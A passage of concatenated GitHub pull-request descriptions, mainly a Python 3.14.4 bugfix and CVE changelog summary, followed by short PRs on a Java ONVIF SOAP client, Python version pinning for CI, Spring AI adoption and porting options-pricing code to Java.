## 3. Library

### 3-1. Regression Fix

- **[gh-144503](https://github.com/python/cpython/issues/144503):** Fix regression from 3.14.3 where `multiprocessing` forkserver would fail with `BrokenPipeError` when parent has very large `sys.argv`

### 3-2. Crash Fixes

- **[gh-146613](https://github.com/python/cpython/issues/146613):** Fix crash in `itertools.groupby` when grouper iterator is concurrently mutated
- **[gh-146080](https://github.com/python/cpython/issues/146080):** Fix `ssl` crash when SNI callback uses garbage-collected SSL object
- **[gh-146090](https://github.com/python/cpython/issues/146090):** Fix `sqlite3` crash when `create_collation` fails with `SQLITE_BUSY`; fix `MemoryError` vs `SystemError` in context callback allocation
- **[gh-145623](https://github.com/python/cpython/issues/145623):** Fix crash in `struct` calling `repr()` or `__sizeof__()` on uninitialized `Struct` object
- **[gh-145301](https://github.com/python/cpython/issues/145301):** Fix crashes in `hmac` and `hashlib` when C extension module initialization fails
- **[gh-144984](https://github.com/python/cpython/issues/144984):** Fix crash in `xml.parsers.expat.ExternalEntityParserCreate` on allocation failure
- **[gh-144833](https://github.com/python/cpython/issues/144833):** Fix use-after-free in `ssl` when `SSL_new()` returns `NULL`
- **[gh-143637](https://github.com/python/cpython/issues/143637):** Fix crash in `socket.sendmsg()` from re-entrant ancillary data mutation
- **[gh-143543](https://github.com/python/cpython/issues/143543):** Fix crash in `itertools.groupby` from re-entrant `__eq__` during key comparison
- **[gh-140652](https://github.com/python/cpython/issues/140652):** Fix crash in `_interpchannels.list_all` after closing a channel
- **[gh-142781](https://github.com/python/cpython/issues/142781):** Fix `zoneinfo.ZoneInfo` crash when internal class-level cache is inconsistent
- **[gh-142787](https://github.com/python/cpython/issues/142787):** Fix `sqlite3` assertion failure in blob subscript with empty slices

### 3-3. Security-Related Library Fixes

- **[gh-145883](https://github.com/python/cpython/issues/145883):** Fix heap buffer overflow reads from malformed TZif data in `zoneinfo` (OSS-Fuzz)
- **[gh-146310](https://github.com/python/cpython/issues/146310):** `ensurepip` no longer looks for `pip-*.whl` in the current directory
- **[gh-146083](https://github.com/python/cpython/issues/146083):** Update bundled libexpat to 2.7.5
- **[gh-144363](https://github.com/python/cpython/issues/144363):** Update bundled libexpat to 2.7.4

### 3-4. Free-Threaded Build Library Fixes

- **[gh-144777](https://github.com/python/cpython/issues/144777):** Fix data races in `io.IncrementalNewlineDecoder`
- **[gh-144809](https://github.com/python/cpython/issues/144809):** Make `collections.deque` copy atomic
- **[gh-144494](https://github.com/python/cpython/issues/144494):** Fix performance regression in `asyncio.all_tasks`
- **[gh-145446](https://github.com/python/cpython/issues/145446):** Make `functools.partial` safer with keywords

### 3-5. Other Notable Library Fixes

- **[gh-146556](https://github.com/python/cpython/issues/146556):** Fix `annotationlib.get_annotations` hanging on circular `__wrapped__` chains
- **[gh-145633](https://github.com/python/cpython/issues/145633):** Fix `struct.pack('f', float)` to use `PyFloat_Pack4` and raise `OverflowError`
- **[gh-146076](https://github.com/python/cpython/issues/146076):** Fix `zoneinfo` crashes when deleting `_weak_cache` from a subclass
- **[gh-146054](https://github.com/python/cpython/issues/146054):** Limit size of `encodings.search_function` cache (OSS-Fuzz)
- **[gh-146004](https://github.com/python/cpython/issues/146004):** All `-X` options now propagated to child processes spawned by `multiprocessing`
- **[gh-145754](https://github.com/python/cpython/issues/145754):** Fix mock autospec with `FORWARDREF` annotation format
- **[gh-145750](https://github.com/python/cpython/issues/145750):** Avoid UB from signed integer overflow in `struct` format string parsing (OSS-Fuzz)
- **[gh-145492](https://github.com/python/cpython/issues/145492):** Fix infinite recursion in `collections.defaultdict.__repr__` when self-referencing
- **[gh-145616](https://github.com/python/cpython/issues/145616):** Detect Android sysconfig ABI correctly on 32-bit ARM
- **[gh-145551](https://github.com/python/cpython/issues/145551):** Fix `InvalidStateError` when cancelling `asyncio` subprocesses
- **[gh-145417](https://github.com/python/cpython/issues/145417):** Fix `venv` preserving incorrect SELinux context for `Activate.ps1`
- **[gh-145376](https://github.com/python/cpython/issues/145376):** Fix double free and null pointer dereference in `hashlib` and `hmac`
- **[gh-145264](https://github.com/python/cpython/issues/145264):** Base64 decoder no longer ignores excess data after first padded quad (RFC 4648 conformance)
- **[gh-145158](https://github.com/python/cpython/issues/145158):** Avoid UB from signed integer overflow in `struct` format strings
- **[gh-144986](https://github.com/python/cpython/issues/144986):** Fix memory leak in `atexit.register()`
- **[gh-88091](https://github.com/python/cpython/issues/88091):** Fix `unicodedata.decomposition` for Hangul characters
- **[gh-144782](https://github.com/python/cpython/issues/144782):** Fix `argparse.ArgumentParser` to be pickleable
- **[gh-144259](https://github.com/python/cpython/issues/144259):** Fix inconsistent display of long multiline pasted content in the REPL
- **[gh-144156](https://github.com/python/cpython/issues/144156):** Fix email header folding with RFC 2047 encoded words
- **[gh-66305](https://github.com/python/cpython/issues/66305):** Fix hang on Windows in `tempfile` when directory is non-writable
- **[gh-140814](https://github.com/python/cpython/issues/140814):** `multiprocessing.freeze_support()` no longer sets default start method as side effect
- **[gh-144475](https://github.com/python/cpython/issues/144475):** Make `repr()` on `functools.partial` safer during concurrent attribute replacement
- **[gh-144538](https://github.com/python/cpython/issues/144538):** Bump bundled pip in `ensurepip` to 26.0.1
- **[gh-144316](https://github.com/python/cpython/issues/144316):** Fix crash in `_remote_debugging`
- **[gh-143698](https://github.com/python/cpython/issues/143698):** Allow `scheduler` and `setpgroup` to be `None` in `os.posix_spawn`; raise `TypeError` instead of `SystemError`
- **[gh-142516](https://github.com/python/cpython/issues/142516):** Fix `ssl.SSLContext` reference leaks
- **[gh-143304](https://github.com/python/cpython/issues/143304):** Fix `ctypes.CDLL` to honor the `handle` parameter on POSIX
- **[gh-142763](https://github.com/python/cpython/issues/142763):** Fix race condition between `ZoneInfo` creation and `clear_cache()`
- **[gh-142352](https://github.com/python/cpython/issues/142352):** Fix `asyncio.StreamWriter.start_tls` data loss when upgrading to TLS mid-stream
- **[gh-141707](https://github.com/python/cpython/issues/141707):** Don't change `TarInfo` type from `AREGTYPE` to `DIRTYPE` when parsing GNU long name headers
- **[gh-139933](https://github.com/python/cpython/issues/139933):** Improve `AttributeError` suggestions for classes with custom `__dir__`
- **[gh-137335](https://github.com/python/cpython/issues/137335):** Eliminate name conflicts for named pipes in `multiprocessing` and `asyncio` on Windows
- **[gh-80667](https://github.com/python/cpython/issues/80667):** Support lookup for Tangut Ideographs in `unicodedata`

## 4. Documentation

- **[gh-126676](https://github.com/python/cpython/issues/126676):** Expand `argparse` documentation for `type=bool` with demonstration of surprising behavior
- **[gh-145649](https://github.com/python/cpython/issues/145649):** Fix text wrapping in `-X` option descriptions in the `python(1)` man page
- **[gh-145450](https://github.com/python/cpython/issues/145450):** Document missing public `wave.Wave_write` getter methods
- **[gh-136246](https://github.com/python/cpython/issues/136246):** New "Improve this page" link in docs sidebar

## 5. Build

- **[gh-146541](https://github.com/python/cpython/issues/146541):** Android testbed can now be built for 32-bit ARM and x86 targets
- **[gh-146498](https://github.com/python/cpython/issues/146498):** iOS XCframework build: ensure libpython isn't included in installed app content
- **[gh-146450](https://github.com/python/cpython/issues/146450):** Android build script parity improvements
- **[gh-146446](https://github.com/python/cpython/issues/146446):** iOS XCframework clean target is now more selective for single architectures
- **[gh-145801](https://github.com/python/cpython/issues/145801):** Use `-fprofile-update=atomic` with GCC PGO to prevent `.gcda` corruption

## 6. Windows

- **[gh-145307](https://github.com/python/cpython/issues/145307):** Defer loading of `psapi.dll` until used by `ctypes.util.dllist`
- **[gh-144551](https://github.com/python/cpython/issues/144551):** Update bundled OpenSSL to 3.0.19
- **[gh-140131](https://github.com/python/cpython/issues/140131):** Fix REPL cursor position when module completion suggestion hits console width

## 7. macOS

- **[gh-144551](https://github.com/python/cpython/issues/144551):** Update macOS installer to use OpenSSL 3.0.19
- **[gh-137586](https://github.com/python/cpython/issues/137586):** Invoke `osascript` with absolute path in `webbrowser` and `turtledemo`

## 8. C API

- **[gh-146056](https://github.com/python/cpython/issues/146056):** `PyUnicodeWriter_WriteRepr` now supports `NULL` argument
- **[gh-145010](https://github.com/python/cpython/issues/145010):** Use GCC dialect alternatives for inline assembly in `object.h` for `-masm=intel` compatibility
- **[gh-144981](https://github.com/python/cpython/issues/144981):** Make `PyUnstable_Code_SetExtra`, `PyUnstable_Code_GetExtra`, and `PyUnstable_Eval_RequestCodeExtraIndex` thread-safe on free-threaded builds

## 9. Tests

- **[gh-144418](https://github.com/python/cpython/issues/144418):** Android testbed emulator RAM increased from 2 GB to 4 GB
- **[gh-146202](https://github.com/python/cpython/issues/146202):** Fix race condition in regrtest temp directory creation on Windows
- **[gh-144739](https://github.com/python/cpython/issues/144739):** Skip `MemoryProtectionTest` when compiled with older expat but tests run with newer

*Source: [Python 3.14.4 Release](https://www.python.org/downloads/release/python-3144/) · [Full Changelog](https://docs.python.org/release/3.14.4/whatsnew/changelog.html)*

title: [python] Bump Python to 3.14.4
body:
## 0. Summary of Changes

**Release date:** April 7, 2026
**Scope:** ~337 bugfixes, build improvements, and documentation changes

## 1. Security

| CVE | Issue | Description |
|-----|-------|-------------|
| CVE-2026-4224 | [gh-145986](https://github.com/python/cpython/issues/145986) | Fix crash from unbounded C recursion in `xml.parsers.expat` when converting deeply nested XML content models with `ElementDeclHandler` |
| CVE-2026-3644 | [gh-145599](https://github.com/python/cpython/issues/145599) | Reject control characters in `http.cookies.Morsel.update()` and `BaseCookie.js_output()` |
| CVE-2026-2297 | [gh-145506](https://github.com/python/cpython/issues/145506) | Ensure `SourcelessFileLoader` uses `io.open_code` when opening `.pyc` files |
| — | [gh-144370](https://github.com/python/cpython/issues/144370) | Disallow control characters in status in `wsgiref.handlers` to prevent HTTP header injection |
| — | [gh-143930](https://github.com/python/cpython/issues/143930) | Reject leading dashes in URLs passed to `webbrowser.open()` |

## 2. Core and Builtins

### 2-1. Crash / Memory Safety Fixes

- **[gh-148157](https://github.com/python/cpython/issues/148157):** Fix crash when parsing invalid type comments for function parameters (OSS-Fuzz)
- **[gh-146615](https://github.com/python/cpython/issues/146615):** Fix crash in `__get__` for `METH_METHOD` descriptors with invalid second argument
- **[gh-145783](https://github.com/python/cpython/issues/145783):** Fix unlikely parser crash when errors were not propagated (OSS-Fuzz)
- **[gh-145792](https://github.com/python/cpython/issues/145792):** Fix out-of-bounds access invoking faulthandler without VLA support
- **[gh-145701](https://github.com/python/cpython/issues/145701):** Fix `SystemError` when `__classdict__` or `__conditional_annotations__` is in a class-scope inlined comprehension (OSS-Fuzz)
- **[gh-145335](https://github.com/python/cpython/issues/145335):** Fix crash in `os.pathconf` when called with `-1`
- **[gh-145234](https://github.com/python/cpython/issues/145234):** Fix `SystemError` in parser when encoding cookie decodes to carriage returns
- **[gh-145142](https://github.com/python/cpython/issues/145142):** Fix crash in free-threaded build when `str.maketrans` dict is concurrently modified
- **[gh-144872](https://github.com/python/cpython/issues/144872):** Fix heap buffer overflow in the parser (OSS-Fuzz)
- **[gh-144766](https://github.com/python/cpython/issues/144766):** Fix crash in fork child process when perf support is enabled
- **[gh-144759](https://github.com/python/cpython/issues/144759):** Fix undefined behavior in lexer with `NULL` pointer arithmetic
- **[gh-144601](https://github.com/python/cpython/issues/144601):** Fix crash when importing a module whose `PyInit` function raises an exception from a subinterpreter
- **[gh-143636](https://github.com/python/cpython/issues/143636):** Fix crash when calling `SimpleNamespace.__replace__()` on non-namespace instances
- **[gh-140594](https://github.com/python/cpython/issues/140594):** Fix out-of-bounds read when a single NUL character is read from stdin
- **[gh-146056](https://github.com/python/cpython/issues/146056):** Fix `repr()` for lists and tuples containing `NULL`s

### 2-2. Free-Threaded Build Improvements

- **[gh-148144](https://github.com/python/cpython/issues/148144):** Initialize `_PyInterpreterFrame.visited` when copying frames so incremental GC doesn't read uninitialized bytes
- **[gh-146041](https://github.com/python/cpython/issues/146041):** Fix scaling bottleneck in `sys.intern` and `PyObject_SetAttr` by avoiding interpreter-wide lock
- **[gh-145779](https://github.com/python/cpython/issues/145779):** Improve scaling of `classmethod` and `staticmethod` calls
- **[gh-145685](https://github.com/python/cpython/issues/145685):** Improve scaling of type attribute lookups by avoiding contention on internal type lock
- **[gh-145713](https://github.com/python/cpython/issues/145713):** Make `bytearray.resize` thread-safe using critical sections
- **[gh-145615](https://github.com/python/cpython/issues/145615):** Fix memory leak where mimalloc pages became permanently unreclaimable
- **[gh-145566](https://github.com/python/cpython/issues/145566):** Skip stop-the-world pause when reassigning `__class__` on newly created objects
- **[gh-145036](https://github.com/python/cpython/issues/145036):** Fix race condition in `list.__sizeof__`
- **[gh-144513](https://github.com/python/cpython/issues/144513):** Fix potential deadlock using critical sections during stop-the-world pauses
- **[gh-144446](https://github.com/python/cpython/issues/144446):** Fix data races when reading frame object attributes while another thread executes the frame
- **[gh-144438](https://github.com/python/cpython/issues/144438):** Align QSBR thread state array to 64-byte cache line boundary to avoid false sharing
- **[gh-143650](https://github.com/python/cpython/issues/143650):** Fix race condition in `importlib` where a thread could receive a stale module reference

### 2-3. Other Core Fixes

- **[gh-146308](https://github.com/python/cpython/issues/146308):** Fix error handling issues in `_remote_debugging` module
- **[gh-146128](https://github.com/python/cpython/issues/146128):** Fix bug causing constant values to be partially corrupted in AArch64 JIT code
- **[gh-146250](https://github.com/python/cpython/issues/146250):** Fix memory leak in `SyntaxError` when re-initializing
- **[gh-146245](https://github.com/python/cpython/issues/146245):** Fix reference leaks in `socket` when audit hooks raise exceptions
- **[gh-146196](https://github.com/python/cpython/issues/146196):** Fix potential UB in `PyUnicodeWriter_WriteASCII` by adding zero-length check
- **[gh-146227](https://github.com/python/cpython/issues/146227):** Fix wrong type in `_Py_atomic_load_uint16` (C11 atomics backend)
- **[gh-146092](https://github.com/python/cpython/issues/146092):** Handle memory allocation failures on `str` and `float` opcodes
- **[gh-145990](https://github.com/python/cpython/issues/145990):** Sort `python --help-env` and `python --help-xoptions` output
- **[gh-145376](https://github.com/python/cpython/issues/145376):** Fix GC tracking in `structseq.__replace__()` and reference leaks in error scenarios
- **[gh-142183](https://github.com/python/cpython/issues/142183):** Avoid pathological slowdown from repeated calls at a specific stack depth
- **[gh-145187](https://github.com/python/cpython/issues/145187):** Fix assertion fail when type parameter bound contains invalid expression in conditional block
- **[gh-144563](https://github.com/python/cpython/issues/144563):** Fix Tachyon profiler interaction with `ctypes` and modules loading Python shared library
- **[gh-130555](https://github.com/python/cpython/issues/130555):** Fix use-after-free in `dict.clear` with embedded values and re-entrant mutation
- **[gh-130327](https://github.com/python/cpython/issues/130327):** Fix erroneous clearing of `__dict__` if overwritten at runtime
- **[gh-141732](https://github.com/python/cpython/issues/141732):** Ensure `__repr__` for `ExceptionGroup` is not affected by subsequent mutation of original sequence
- **[gh-91636](https://github.com/python/cpython/issues/91636):** Clear weakrefs to unreachable objects created during GC finalizer execution
- **[gh-80667](https://github.com/python/cpython/issues/80667):** `\N{name}` escape syntax now supports CJK ideographs and Hangul syllables with case-insensitive names

## 3. Library

### 3-1. Regression Fix

- **[gh-144503](https://github.com/python/cpython/issues/144503):** Fix regression from 3.14.3 where `multiprocessing` forkserver would fail with `BrokenPipeError` when parent has very large `sys.argv`

### 3-2. Crash Fixes

- **[gh-146613](https://github.com/python/cpython/issues/146613):** Fix crash in `itertools.groupby` when grouper iterator is concurrently mutated
- **[gh-146080](https://github.com/python/cpython/issues/146080):** Fix `ssl` crash when SNI callback uses garbage-collected SSL object
- **[gh-146090](https://github.com/python/cpython/issues/146090):** Fix `sqlite3` crash when `create_collation` fails with `SQLITE_BUSY`; fix `MemoryError` vs `SystemError` in context callback allocation
- **[gh-145623](https://github.com/python/cpython/issues/145623):** Fix crash in `struct` calling `repr()` or `__sizeof__()` on uninitialized `Struct` object
- **[gh-145301](https://github.com/python/cpython/issues/145301):** Fix crashes in `hmac` and `hashlib` when C extension module initialization fails
- **[gh-144984](https://github.com/python/cpython/issues/144984):** Fix crash in `xml.parsers.expat.ExternalEntityParserCreate` on allocation failure
- **[gh-144833](https://github.com/python/cpython/issues/144833):** Fix use-after-free in `ssl` when `SSL_new()` returns `NULL`
- **[gh-143637](https://github.com/python/cpython/issues/143637):** Fix crash in `socket.sendmsg()` from re-entrant ancillary data mutation
- **[gh-143543](https://github.com/python/cpython/issues/143543):** Fix crash in `itertools.groupby` from re-entrant `__eq__` during key comparison
- **[gh-140652](https://github.com/python/cpython/issues/140652):** Fix crash in `_interpchannels.list_all` after closing a channel
- **[gh-142781](https://github.com/python/cpython/issues/142781):** Fix `zoneinfo.ZoneInfo` crash when internal class-level cache is inconsistent
- **[gh-142787](https://github.com/python/cpython/issues/142787):** Fix `sqlite3` assertion failure in blob subscript with empty slices

### 3-3. Security-Related Library Fixes

- **[gh-145883](https://github.com/python/cpython/issues/145883):** Fix heap buffer overflow reads from malformed TZif data in `zoneinfo` (OSS-Fuzz)
- **[gh-146310](https://github.com/python/cpython/issues/146310):** `ensurepip` no longer looks for `pip-*.whl` in the current directory
- **[gh-146083](https://github.com/python/cpython/issues/146083):** Update bundled libexpat to 2.7.5
- **[gh-144363](https://github.com/python/cpython/issues/144363):** Update bundled libexpat to 2.7.4

### 3-4. Free-Threaded Build Library Fixes

- **[gh-144777](https://github.com/python/cpython/issues/144777):** Fix data races in `io.IncrementalNewlineDecoder`
- **[gh-144809](https://github.com/python/cpython/issues/144809):** Make `collections.deque` copy atomic
- **[gh-144494](https://github.com/python/cpython/issues/144494):** Fix performance regression in `asyncio.all_tasks`
- **[gh-145446](https://github.com/python/cpython/issues/145446):** Make `functools.partial` safer with keywords

### 3-5. Other Notable Library Fixes

- **[gh-146556](https://github.com/python/cpython/issues/146556):** Fix `annotationlib.get_annotations` hanging on circular `__wrapped__` chains
- **[gh-145633](https://github.com/python/cpython/issues/145633):** Fix `struct.pack('f', float)` to use `PyFloat_Pack4` and raise `OverflowError`
- **[gh-146076](https://github.com/python/cpython/issues/146076):** Fix `zoneinfo` crashes when deleting `_weak_cache` from a subclass
- **[gh-146054](https://github.com/python/cpython/issues/146054):** Limit size of `encodings.search_function` cache (OSS-Fuzz)
- **[gh-146004](https://github.com/python/cpython/issues/146004):** All `-X` options now propagated to child processes spawned by `multiprocessing`
- **[gh-145754](https://github.com/python/cpython/issues/145754):** Fix mock autospec with `FORWARDREF` annotation format
- **[gh-145750](https://github.com/python/cpython/issues/145750):** Avoid UB from signed integer overflow in `struct` format string parsing (OSS-Fuzz)
- **[gh-145492](https://github.com/python/cpython/issues/145492):** Fix infinite recursion in `collections.defaultdict.__repr__` when self-referencing
- **[gh-145616](https://github.com/python/cpython/issues/145616):** Detect Android sysconfig ABI correctly on 32-bit ARM
- **[gh-145551](https://github.com/python/cpython/issues/145551):** Fix `InvalidStateError` when cancelling `asyncio` subprocesses
- **[gh-145417](https://github.com/python/cpython/issues/145417):** Fix `venv` preserving incorrect SELinux context for `Activate.ps1`
- **[gh-145376](https://github.com/python/cpython/issues/145376):** Fix double free and null pointer dereference in `hashlib` and `hmac`
- **[gh-145264](https://github.com/python/cpython/issues/145264):** Base64 decoder no longer ignores excess data after first padded quad (RFC 4648 conformance)
- **[gh-145158](https://github.com/python/cpython/issues/145158):** Avoid UB from signed integer overflow in `struct` format strings
- **[gh-144986](https://github.com/python/cpython/issues/144986):** Fix memory leak in `atexit.register()`
- **[gh-88091](https://github.com/python/cpython/issues/88091):** Fix `unicodedata.decomposition` for Hangul characters
- **[gh-144782](https://github.com/python/cpython/issues/144782):** Fix `argparse.ArgumentParser` to be pickleable
- **[gh-144259](https://github.com/python/cpython/issues/144259):** Fix inconsistent display of long multiline pasted content in the REPL
- **[gh-144156](https://github.com/python/cpython/issues/144156):** Fix email header folding with RFC 2047 encoded words
- **[gh-66305](https://github.com/python/cpython/issues/66305):** Fix hang on Windows in `tempfile` when directory is non-writable
- **[gh-140814](https://github.com/python/cpython/issues/140814):** `multiprocessing.freeze_support()` no longer sets default start method as side effect
- **[gh-144475](https://github.com/python/cpython/issues/144475):** Make `repr()` on `functools.partial` safer during concurrent attribute replacement
- **[gh-144538](https://github.com/python/cpython/issues/144538):** Bump bundled pip in `ensurepip` to 26.0.1
- **[gh-144316](https://github.com/python/cpython/issues/144316):** Fix crash in `_remote_debugging`
- **[gh-143698](https://github.com/python/cpython/issues/143698):** Allow `scheduler` and `setpgroup` to be `None` in `os.posix_spawn`; raise `TypeError` instead of `SystemError`
- **[gh-142516](https://github.com/python/cpython/issues/142516):** Fix `ssl.SSLContext` reference leaks
- **[gh-143304](https://github.com/python/cpython/issues/143304):** Fix `ctypes.CDLL` to honor the `handle` parameter on POSIX
- **[gh-142763](https://github.com/python/cpython/issues/142763):** Fix race condition between `ZoneInfo` creation and `clear_cache()`
- **[gh-142352](https://github.com/python/cpython/issues/142352):** Fix `asyncio.StreamWriter.start_tls` data loss when upgrading to TLS mid-stream
- **[gh-141707](https://github.com/python/cpython/issues/141707):** Don't change `TarInfo` type from `AREGTYPE` to `DIRTYPE` when parsing GNU long name headers
- **[gh-139933](https://github.com/python/cpython/issues/139933):** Improve `AttributeError` suggestions for classes with custom `__dir__`
- **[gh-137335](https://github.com/python/cpython/issues/137335):** Eliminate name conflicts for named pipes in `multiprocessing` and `asyncio` on Windows
- **[gh-80667](https://github.com/python/cpython/issues/80667):** Support lookup for Tangut Ideographs in `unicodedata`

## 4. Documentation

- **[gh-126676](https://github.com/python/cpython/issues/126676):** Expand `argparse` documentation for `type=bool` with demonstration of surprising behavior
- **[gh-145649](https://github.com/python/cpython/issues/145649):** Fix text wrapping in `-X` option descriptions in the `python(1)` man page
- **[gh-145450](https://github.com/python/cpython/issues/145450):** Document missing public `wave.Wave_write` getter methods
- **[gh-136246](https://github.com/python/cpython/issues/136246):** New "Improve this page" link in docs sidebar

## 5. Build

- **[gh-146541](https://github.com/python/cpython/issues/146541):** Android testbed can now be built for 32-bit ARM and x86 targets
- **[gh-146498](https://github.com/python/cpython/issues/146498):** iOS XCframework build: ensure libpython isn't included in installed app content
- **[gh-146450](https://github.com/python/cpython/issues/146450):** Android build script parity improvements
- **[gh-146446](https://github.com/python/cpython/issues/146446):** iOS XCframework clean target is now more selective for single architectures
- **[gh-145801](https://github.com/python/cpython/issues/145801):** Use `-fprofile-update=atomic` with GCC PGO to prevent `.gcda` corruption

## 6. Windows

- **[gh-145307](https://github.com/python/cpython/issues/145307):** Defer loading of `psapi.dll` until used by `ctypes.util.dllist`
- **[gh-144551](https://github.com/python/cpython/issues/144551):** Update bundled OpenSSL to 3.0.19
- **[gh-140131](https://github.com/python/cpython/issues/140131):** Fix REPL cursor position when module completion suggestion hits console width

## 7. macOS

- **[gh-144551](https://github.com/python/cpython/issues/144551):** Update macOS installer to use OpenSSL 3.0.19
- **[gh-137586](https://github.com/python/cpython/issues/137586):** Invoke `osascript` with absolute path in `webbrowser` and `turtledemo`

## 8. C API

- **[gh-146056](https://github.com/python/cpython/issues/146056):** `PyUnicodeWriter_WriteRepr` now supports `NULL` argument
- **[gh-145010](https://github.com/python/cpython/issues/145010):** Use GCC dialect alternatives for inline assembly in `object.h` for `-masm=intel` compatibility
- **[gh-144981](https://github.com/python/cpython/issues/144981):** Make `PyUnstable_Code_SetExtra`, `PyUnstable_Code_GetExtra`, and `PyUnstable_Eval_RequestCodeExtraIndex` thread-safe on free-threaded builds

## 9. Tests

- **[gh-144418](https://github.com/python/cpython/issues/144418):** Android testbed emulator RAM increased from 2 GB to 4 GB
- **[gh-146202](https://github.com/python/cpython/issues/146202):** Fix race condition in regrtest temp directory creation on Windows
- **[gh-144739](https://github.com/python/cpython/issues/144739):** Skip `MemoryProtectionTest` when compiled with older expat but tests run with newer

*Source: [Python 3.14.4 Release](https://www.python.org/downloads/release/python-3144/) · [Full Changelog](https://docs.python.org/release/3.14.4/whatsnew/changelog.html)*

title: Replace Python client with Java Spring Boot ONVIF Profile T SOAP 1.2 client
body:
Reimplemented ONVIF client in Java Spring Boot with Apache CXF for SOAP 1.2 protocol support, designed to work with hediyenurtut/OnvifServer.

## Architecture

- **Stack**: Java 17, Spring Boot 3.2.3, Apache CXF 4.0.3, JAXB for XML binding
- **Protocol**: SOAP 1.2 (`application/soap+xml`, envelope namespace `http://www.w3.org/2003/05/soap-envelope`)
- **Services**: Device Management, Network Configuration, PTZ Control, Media Operations, Imaging Settings
- **REST Facade**: HTTP endpoints at `/api/onvif/*` for all ONVIF operations

## Implementation

**Models** (52 classes)
- JAXB-annotated request/response models for all operations
- Packages: `device`, `network`, `ptz`, `media`, `imaging`
- Support for H.264/H.265 encoder configurations

**Services** (5 classes)
- `OnvifDeviceService`: GetDeviceInformation, GetServices, GetHostname, SetHostname
- `OnvifNetworkService`: Get/SetNetworkInterfaces, Get/SetNetworkDefaultGateway  
- `OnvifPTZService`: Move, ContinuousMove, Stop, Presets, HomePosition, GetMoveOptions
- `OnvifMediaService`: GetVideoSources, GetVideoEncoderConfigurations, AddConfiguration
- `OnvifImagingService`: Get/SetImageSettings, GetOptions

**Configuration**
```properties
onvif.camera.host=192.168.1.100
onvif.camera.port=8080
onvif.camera.service-path=/onvif/device_service
```

## Example Usage

```java
// Service layer (SOAP)
@Autowired
private OnvifPTZService ptzService;

ptzService.continuousMove(profileToken, 
    new PTZVector(new Vector2D(0.5f, 0.0f), new Vector1D(0.0f)));
ptzService.stop(profileToken, true, true);

// REST API
POST /api/onvif/ptz/continuous-move?profileToken=profile1
{
  "panTilt": {"x": 0.5, "y": 0.0},
  "zoom": {"x": 0.0}
}
```

## SOAP Request Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope 
  xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
  xmlns:tptz="http://www.onvif.org/ver20/ptz/wsdl"
  xmlns:tt="http://www.onvif.org/ver10/schema">
  <soap:Body>
    <tptz:ContinuousMove>
      <tptz:ProfileToken>profile1</tptz:ProfileToken>
      <tptz:Velocity>...</tptz:Velocity>
    </tptz:ContinuousMove>
  </soap:Body>
</soap:Envelope>
```

All requests use `Content-Type: application/soap+xml; charset=utf-8` per ONVIF Profile T specification.

title: Feature/v0.2.0 updates
body:
## Summary

v0.2.0 release — adds a second curated course, media assets, and documentation improvements.

- **Java Web Programming course** — 4 modules, 4 assignments, capstone. Targets experienced developers (C++, C#, Python) new to Java web. Paradigm shift annotations bridge from multiple source languages.
- **Quick reference cheat sheet** — one-page visual summary of the Upstack workflow (`refs/assets/upstack-quick-reference-v1.jpg`), plus brand brief and generation prompt in `refs/media/`.
- **Docs reorg** — moved concept paper from `refs/` to `docs/`, marked unbuilt features in learning guide, updated all cross-references.
- **Release prep** — CHANGELOG, version bump to 0.2.0, tech spec directory tree updated.

- [ ] Script (progress scripts, utilities)

- [x] Other

## Checklist

- [x] Domain-neutral language in structural elements (if applicable)
- [x] Tech spec updated (if framework change)
- [x] No personal data or secrets included

title: Add .python-version file to pin Python 3.12
body:
## Problem

Railpack installs Python 3.13.13 by default, but pyproject.toml declares `requires-python = ">=3.12,<3.13"`, which explicitly excludes 3.13.x. Poetry detects the mismatch and fails with "Poetry was unable to find a compatible version", causing the build to exit with code 1.

## Solution

Added a `.python-version` file at the repository root containing `3.12`. Mise (the version manager used by Railpack) reads this file and installs Python 3.12.x instead of the default 3.13.x, satisfying the project's requires-python constraint and allowing Poetry to proceed with dependency installation.

### Changes
- **Created** `.python-version`

---
*Generated by [Railway](https://railway.com)*

title: fix: use .python-version for CI Python setup
body:
## Summary

`uv python install 3.12` installed 3.12.13 while `.python-version` pins 3.12.10. This mismatch caused `uv sync --frozen` to recreate the venv, losing dev tools. `uv run --frozen ruff` then failed with "Failed to spawn: ruff".

Fix: Use `uv python install` (reads `.python-version`) instead of `uv python install 3.12`.

🤖 Generated with [Claude Code](https://claude.com/claude-code)

title: python format
body:
This pull request contains small formatting improvements to both the main protocol logic and its associated tests. The changes focus on improving code readability by reformatting conditional statements and function calls.

- Code formatting improvements:
  * Reformatted a conditional statement in the `_handle_response` method of `snowball_protocol.py` to improve readability by splitting it across multiple lines.
  * Reformatted function calls in the `test_handle_p2p_response_collects_and_updates_confidence` test in `test_snowball.py` to use multi-line formatting for better clarity.

title: Adopt Spring AI for embeddings, RAG, and LLM integration
body:
## Summary
- Integrate **Spring AI** framework into the architecture, replacing custom Ollama client and Python sidecar embed/search endpoints
- Python ML sidecar scope reduced from 4 endpoints to 2 (Whisper transcription + Piper TTS only)
- Updated all architecture and flow diagrams (Mermaid) to reflect Spring AI components (`OllamaChatModel`, `OllamaEmbeddingModel`, `ChromaDbVectorStore`, `RetrievalAugmentationAdvisor`, `TokenTextSplitter`)
- Updated tech stack version matrix and design rationale

## Linear Issues
- APP-73: Scaffold Spring Boot + Spring AI project
- APP-80: Configure Spring AI embeddings and ChromaDB vector store
- APP-82: Configure Spring AI OllamaChatModel with streaming
- APP-83: Implement RAG with Spring AI RetrievalAugmentationAdvisor
- APP-74: Slim Python sidecar (transcribe + TTS only)
- APP-81: Updated import pipeline to use Spring AI

## Test plan
- [ ] Verify Mermaid diagrams render correctly on GitHub
- [ ] Review architecture changes for consistency across DESIGN.md and DIAGRAMS.md
- [ ] Confirm no stale references to Python sidecar `/embed` or `/search` endpoints

title: feat: Port Options Edge Agent Calculations to Java
body:
**PR #1 Summary: Port Options Edge Calculations to Java**

**Overview**
Migrated Options Edge analytics calculations from Python to Java with improved naming and build fixes.

**Changes**

| Category | Files | Description |
|----------|-------|-------------|
| **Naming Refactor** | `BlackScholes.java` | `normCdf(x)` → `calculateNormalCumulativeDistribution(normalizedValue)`, `callPrice` → `calculateCallOptionPrice` with full param names, etc. |
| | `VolSurfaceCalculator.java` | `rr25` → `riskReversal25Delta`, `bf25` → `butterfly25Delta`, `atmIv` → `atTheMoneyImpliedVolatility` |
| | `IronFlyCalculator.java` | Updated field references to use new names |
| | `OptionsAnalyticsService.java` | Updated all references |
